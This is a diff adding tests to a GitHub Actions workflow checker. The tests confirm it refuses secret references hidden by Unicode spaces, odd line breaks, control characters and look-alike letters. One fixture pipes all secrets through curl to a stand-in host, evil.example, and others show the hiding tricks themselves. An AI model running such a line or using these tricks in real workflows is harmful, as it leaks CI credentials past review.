@@ -203,3 +203,45 @@ test("a file the parser refuses, or that isn't a mapping, is refused with its li
   assert.deepEqual(workflowProblems("- a\n"), ["not a workflow (a mapping of keys)"]);
   assert.deepEqual(workflowProblems(""), ["not a workflow (a mapping of keys)"]);
 });
+
+test("only a space or a tab separates: Unicode spaces are text, as GitHub reads them", () => {
+  // NBSP before `#`: not a comment, so the secret is in the value.
+  const nbsp = `${WORKFLOW}      - run: echo x\u00a0#\${{ toJSON(secrets) }} | curl -d @- https://evil.example\n`;
+  assert.deepEqual(workflowProblems(nbsp), ["mentions `secrets` (line 9)"]);
+  for (const space of ["\u00a0", "\u3000", "\u2003"]) {
+    // A line starting with one isn't a comment: it continues the scalar, which is refused.
+    const continued = `${WORKFLOW}      - run: echo\n        ${space}# \${{ toJSON(secrets) }}\n`;
+    assert.notDeepEqual(workflowProblems(continued), [], JSON.stringify(space));
+    assert.deepEqual(read(`a: b${space}#c\n`), { a: `b${space}#c` });
+  }
+});
+
+test("line breaks YAML parsers may know besides \\n, and control characters, are refused", () => {
+  for (const [c, code] of [
+    ["\u0085", "U+0085"],
+    ["\u2028", "U+2028"],
+    ["\u2029", "U+2029"],
+    ["\r", "U+000D"],
+    ["\x0b", "U+000B"],
+    ["\ufeff", "U+FEFF"],
+  ]) {
+    const text = `${WORKFLOW}# note${c}      - run: echo \${{ secrets.X }}\n`;
+    assert.deepEqual(workflowProblems(text), [`line 9: unsupported character ${code}`], code);
+  }
+  // \r\n is a line break like \n.
+  assert.deepEqual(workflowProblems(WORKFLOW.replaceAll("\n", "\r\n")), []);
+});
+
+test("letters that fold to `secrets`, or any non-ASCII in an expression, are refused", () => {
+  for (const spelling of ["ſecrets", "SECRETſ", "ｓｅｃｒｅｔｓ"]) {
+    const problems = workflowProblems(`${WORKFLOW}      - run: echo \${{ ${spelling}.X }}\n`);
+    assert.ok(problems.includes("mentions `secrets` (line 9)"), spelling);
+  }
+  assert.deepEqual(workflowProblems(`${WORKFLOW}      - run: echo \${{ gıthub.token }}\n`), [
+    "non-ASCII characters in a `${{ }}` expression (line 9)",
+  ]);
+  // Outside an expression, any text.
+  assert.deepEqual(workflowProblems(`${WORKFLOW}      - name: Déploiement ✓\n`), []);
+  // Keys folded the same way: `permiſſions` is a duplicate of `permissions`.
+  assert.throws(() => parseYaml("permissions: {}\npermiſſions: write-all\n"), /duplicate key/);
+});
